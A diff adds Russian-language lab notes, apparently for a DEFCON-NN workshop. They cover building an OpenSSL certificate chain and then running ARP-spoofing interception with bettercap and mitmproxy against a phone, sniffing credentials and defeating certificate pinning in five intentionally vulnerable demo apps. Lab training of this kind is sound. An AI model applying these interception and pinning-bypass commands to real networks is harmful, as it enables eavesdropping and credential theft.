@@ -1,0 +1,191 @@
+Скрипт для упрощения создания сертификатов OpenSSL: /usr/lib/ssl/misc/CA.pl (that's on Debian/Kali, /etc/ssl/misc/CA.pl on Arch)
+/etc/ssl/openssl.cnf -- дефолтные настройки. Надо поправить значение dir 
+(/etc/ssl -> ./demoCA, т.к. скрипт использует именно эту директорию)
+https://superuser.com/questions/126121/how-to-create-my-own-certificate-chain
+https://web.archive.org/web/20100504162138/http://www.ibm.com/developerworks/java/library/j-certgen/
+
+1. Создаем Root CA
+
+CA.pl -newca
+Заполняем поля. (password: abc123)
+
+Генерируются следующий файлы:
+demoCA/
+   cacert.pem              - root certificate
+   index.txt               - база данных выпущенных сертификатов (пока 1)
+   serial                  - порядковый номер последнего выпущенного сертификата("01")
+   certs/                  - пустая
+   crl/                    - пустая (директория для запросов на отозыв сертификатов)
+   newcerts/               - тот же root cert, только под отпечатком в качестве имени файла
+   private/cakey.pem       - приватный ключ от root certificate 
+
+2. Создаем Intermediate CA
+
+CA -newreq
+
+Заполняем поля (password: abc234)
+Генерируются файлы: newkey.pem (ключ) и newreq.pem (неподписанный сертификат)
+
+Необходимо подписать. Хотим получить промежуточное CA, поэтому меняем в openssl.cnf:
+В секции [ usr_cert ] заменяем basicConstraints=CA:FALSE - > TRUE (usr_cert -- секция, которая референсится из ca/default_ca -- как x509_extensions)
+
+CA -sign
+
+На выходе -- newcert.pem. 
+
+3. Создаем конечный юзерский сертификат, подписанный Intermediate CA.
+
+Сначала переименуем созданные файлы в intermediate-файлы. Убираем true -> false в базовых ограничениях.
+Подготавливаем openssl.cnf:
+Заполняем расширения реквеста: req_extensions = v3_req (или другое имя)
+В секции [ v3_req ] указываем
+subjectAltName = DNS:localhost,DNS:*.defcon-nn.ru
+
+Нужно раскомментировать copy_extensions = copy -- чтобы экстеншны из request попали в signed cert.
+
+Затем создаем новый запрос:
+CA -newreq
+
+Получаем запрос в newreq.pem, ключ в newkey.pem (password: abc345)
+
+Подписываем командой openssl (без скрипта CA -- он заточен на наше рутовое CA):
+openssl ca -policy policy_anything -keyfile intermediate-key.pem -cert intermediate-cert.pem -out end-entity-cert.pem -infiles newreq.pem
+
+Переименовываем newreq, newkey -> end-entity-req, end-entity-key.
+
+4. Как использовать в node.js:
+https://nodejs.org/api/https.html#https_https_createserver_options_requestlistener
+https://nodejs.org/api/tls.html#tls_tls_createserver_options_secureconnectionlistener
+https://nodejs.org/api/tls.html#tls_tls_createsecurecontext_options
+
+
+=========
+apt-get install adb bettercap
+
+1. Находим IP-адрес телефона (adb shell ifconfig -- или в Настройках, О телефоне...)
+
+2. Запускаем ARP-спуфер  -- спуфит шлюз цели. Перехват исходящего траффика цели
+
+bettercap -S ARP -T 10.181.0.78
+
+bettercap -S ICMP -T 10.181.0.78 -- дуплекс-спуфинг через ICMP... не так просто..
+
+Дуплекс - для спуфинга шлюза цели + спуфит цель для шлюза. Перехват всего траффика цели
+bettercap -S ARP --full-duplex -T 10.181.0.78
+
+Сниффер и парсер:
+    URLs being visited.
+    HTTPS hosts being visited.
+    HTTP POSTed data.
+    HTTP Basic and Digest authentications.
+    HTTP Cookies.
+    FTP credentials.
+    IRC credentials.
+    POP, IMAP and SMTP credentials.
+    NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.
+    DICT Protocol credentials.
+    MPD Credentials.
+    NNTP Credentials.
+    DHCP messages and authentication.
+    REDIS login credentials.
+    RLOGIN credentials.
+    SNPP credentials.
+    And more!
+bettercap -X -S ARP --full-duplex -T 10.181.0.78
+
+3. HTTP-прокси
+
+git clone https://github.com/evilsocket/bettercap-proxy-modules
+
+bettercap -X -S ARP --full-duplex --proxy --proxy-module=/root/bettercap-proxy-modules/http/hack_title.rb -T 10.181.0.78 
+
+Перехват креденшлов
+
+bettercap -X -S ARP --full-duplex --proxy -T 10.181.0.78 
+
+Заходим в Твиттер...
+
+4. HTTPS-прокси
+
+bettercap -X -S ARP --full-duplex --proxy-https --proxy-pem proxyca.pem -T 10.181.0.78 
+
+v1. Устанавливаем первую версию приложения:
+adb install -r trustall-1.apk
+
+Запускаем bettercap без дополнительных CA, с дефолтным встроенным:
+bettercap --full-duplex --proxy-https -T 192.168.1.102
+
+Перехватываем данные...
+
+v2. Устанавливаем вторую версию приложения:
+adb install -r pinsubj-2.apk
+
+Запускаем bettercap с дефолтным CA: видим ошибку.
+CA не установлено в системе... Давайте установим его
+
+openssl x509 -outform der -in ~/.bettercap/bettercap-ca.pem -out bettercap-ca.crt
+
+adb push bettercap-ca.crt /sdcard/bc.crt
+
+Пробуем снова - и теперь уже видим, что Pinning сработал!
+Сделаем обход этого слабого пиннинга.
+Возьмем bettercap-ca.pem, разделим ключ и сертификат в папке demoCA/cacert.pem и demoCA/private/cakey.pem
+Далее запрос /usr/lib/ssl/misc/CA.pl -newreq, заполняем поля Subject так, как в Intermediate Certificate с сайта mitm.defcon-nn.ru (смотрим в браузере).
+Далее правим /etc/ssl/openssl.cnf, заменяем CA:FALSE на CA:TRUE в sign-атрибутах.. Далее CA.p -sign (чтобы сработал, нужно пустой index.txt и непустой serial)
+
+bettercap не умеет делать cert chain'ы на своих прокси -- поэтому нам нужен более продвинутый внешний прокси. К счастью, есть mitmproxy.
+
+Но нужно вручную подготовить ему цепочку.
+openssl ca -policy policy_anything -keyfile bcdc-key.pem -cert bcdc-cert.pem -out xxxcert.pem -infiles newreq.pem
+
+cat xxxkey.pem xxxcert.pem bcdc-cert.pem > xxxall.pem
+
+bettercap -X --full-duplex --custom-https-proxy 192.168.1.161 --custom-https-proxy-port 8080 -T 192.168.1.102
+
+mitmproxy -T --host --cert *=./xxxall.pem --insecure 
+
+(insecure - т.к. у нас DC7831 CA не trusted, то mitmproxy это видит и дропает...)
+
+==>> Login Successful!
+
+v3. Устанавливаем третью версию приложения:
+adb install -r dirtypin-3.apk
+
+Если запустить как до этого, то увидим, что сработал пиннинг и пресек!
+
+Создаем директорию ./mitmproxy-cadir, в неё кладем bettercap-ca.pem под именем mitmproxy-ca.pem.
+Запускаем:
+
+mitmproxy -T --host --cadir ./mitmproxy-cadir  --insecure --add-upstream-certs-to-client-chain
+
+Победа! Login Successful!
+
+v4. Устанавливаем четвертую версию приложения:
+adb install -r nobasicconstraint-4.apk
+
+Там есть та же уязвимость с как в dirty, но просто потому что я не успел сделать нормальный клинер. Тут есть другая уязвимость, которую мы и проэксплуатируем.
+
+Выпустим такие сертификаты:
+DC7831->DC7831 Intermediate->anotherdomain->mitm.defcon-nn.ru
+...
+
+похоже бага в mitmproxy -- он валидирует чейн и не позволяет лажу добавить) а жаль...
+
+v5. Устанавливаем пятую версию приложения:
+adb install -r badverifier-5.apk
+
+Всё готово для эксплуатации:
+cat dc20e6-key.pem dc20e6-cert.pem dc7831-intermediate-cert.pem > dc20e6-all.pem
+mitmproxy -T --host --insecure --cert *=./dc20e6-all.pem
+
+Т.е. подсовываем сертификат от другого хоста, вполне возможно что валидный - и всё, мы в шоколаде.
+
+v6. Best practice -- неуязвима к подобным атакам.
+Проверяем, если осталось время...
+
+----
+Устанавливаем ca-dc7831.crt на телефон:
+adb push ca-dc7831.crt /sdcard
+Settings->Security->...
+
+
